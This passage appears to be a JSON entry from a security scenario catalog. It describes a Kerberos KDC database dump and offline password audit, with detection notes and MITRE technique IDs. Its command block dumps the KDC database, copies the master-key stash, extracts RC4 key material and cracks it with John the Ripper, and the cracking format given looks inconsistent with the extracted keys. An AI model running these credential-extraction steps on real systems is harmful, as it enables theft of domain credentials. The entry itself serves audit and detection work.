{
  "title": "Kerberos KDC Dump Decryption and JtR Audit",
  "version": "3.0",
  "description": "KDC database dump and decryption workflow that extracts crackable etype material and audits credential strength with John the Ripper.",
  "shortDescription": "KDC Dump Audit",
  "tags": [
    "password-cracking",
    "kerberos",
    "john-the-ripper",
    "kdc-audit",
    "credential-access"
  ],
  "metadata": {
    "descriptionHtml": "<p>This scenario models privileged Kerberos database extraction from a KDC host, decryption/parsing of crackable etype records, and offline auditing via <span style='color:#ef4444;font-weight:bold;'>john</span>. It highlights the transition from encrypted KDC material to crack-ready hash artifacts.</p>",
    "commandsBlock": "# Step 1: Export KDC data\n$ sudo kdb5_util dump -b7 kdc.dump\n$ cp /etc/krb5kdc/stash stash\n\n# Step 2: Decrypt and extract etype material\n$ hprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP '23:\\K(.+?)(?=:)' > rc4.hex\n\n# Step 3: Normalize and crack\n$ tr '[:upper:]' '[:lower:]' < rc4.hex > hash\n$ john --format=krb5-23 hash\n$ OMP_NUM_THREADS=4 john --format=krb5-23 --test",
    "extraInfo": [
      "MIT/Heimdal utilities: kdb5_util, hprop, hpropd",
      "John formats: krb5-23 and nt"
    ],
    "prerequisites": [
      "Privileged access to KDC host and kerberos database files",
      "Authorized audit scope with credential handling controls",
      "Availability of stash/master-key material for decryption"
    ],
    "attackerGains": [
      "Crackable Kerberos principal hash material",
      "Recovered principal plaintexts when cracking succeeds"
    ],
    "detectionNotes": [
      "Monitor privileged access to KDC database and stash files",
      "Harden KDC hosts and restrict backup/export operations",
      "Rotate credentials rapidly if audit reveals weak principals"
    ],
    "mitreCategories": [
      "T1003",
      "T1110.002",
      "T1078"
    ]
  },
